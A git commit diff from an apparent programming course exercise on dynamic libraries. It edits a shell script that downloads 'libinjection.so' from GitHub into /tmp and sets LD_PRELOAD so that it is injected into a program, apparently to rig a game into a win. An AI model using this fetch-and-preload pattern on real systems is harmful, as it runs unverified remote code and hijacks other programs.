9efbc1fea8e6cd90b3660c2f35210c62e0db2049
Osaite Arigbe-Osula <ik.arigbe.osula@gmail.com>
2023-08-21 18:24:08 -0700

    giga million

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/IK-18/alx-low_level_programming/blob/master/0x18-dynamic_libraries/libinjection.so
+wget -P /tmp https://github.com/IK-18/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libinjection.so
 export LD_PRELOAD=/tmp/libinjection.so
